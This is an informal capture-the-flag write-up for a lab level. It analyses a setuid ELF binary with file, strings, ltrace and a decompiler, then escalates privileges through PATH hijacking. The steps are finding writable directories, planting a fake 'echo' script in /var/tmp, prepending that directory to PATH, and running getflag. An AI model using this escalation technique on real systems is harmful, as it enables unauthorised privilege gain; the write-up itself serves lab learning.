# --- reconnaisance ---
- ls -la

- found executable 

- once ran it asks to be exploited (uwu)
>so probably reverse engineering then indentifying and exploiting a vulnerability


# --- target research on system ---

- lets do some analysis on the file

- file ./level03
```txt
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```
>so its an executable...

- strings ./level03
> revealed it.s a c file, gnu c 4.6.3 compiled exec, uses types.h 
- look for vulnerable functions in the output
>vulnerable functions like strcpy, gets, scanf, sprintf, memcpy 
- strings ./level03 | grep "strcpy"
>nothing interesting..



- lets intercept .dll calls with ltrace ./level03
```txt
__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                  = 2003
geteuid()                                                                                                  = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                        = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                        = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                     = 0
```
- maybe system() function exploitable ?
> this function is used to call a shell command (/usr/bin/env echo Exploit me) 


- will use a disassembler now
> scp the file to ur local machine and open it w ghidra or ida free

- output of the main function of the binary
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-8h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = getegid();
  v5 = geteuid();
  setresgid(v4, v4, v4);
  setresuid(v5, v5, v5);
  return system("/usr/bin/env echo Exploit me");
}
```
> viewing the source code in plain C made me recognize an angle of attack 

> what this function " system("/usr/bin/env echo Exploit me"); " does is search for the first instance of the 'echo' command in the directories listed in the PATH env variable
> so if you create a fake echo (AND NOT echo.sh !! remove the extension) it will run your echo instead of the system's echo

- echo $PATH

> ```bash
> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
> ```
> basically to execute my malicious echo i simply need to add its path at the beginning of the string, this is because the system looks for the first echo to execute and ignores any subsequent ones

- we will search for all folders where i have write access to to start writing our echo
> find / -type d -writable 2>/dev/null

- we will write our echo script in /var/tmp
>for starters it will just be
>```sh
>echo "EXPLOITED"
``
- then add its path to PATH + give it executable permission
- export PATH=/var/tmp:$PATH
- chmod +x /var/tmp/echo

- run the binary once again and see if it prints "EXPLOITED" this time
>if it does, it sucessfully runs arbitrary code
>add the command whoami, it should print flag03


## --- solved ---
<details>
        <summary>solution</summary>
         add getflag command and get the token and move to level04
    </details>  
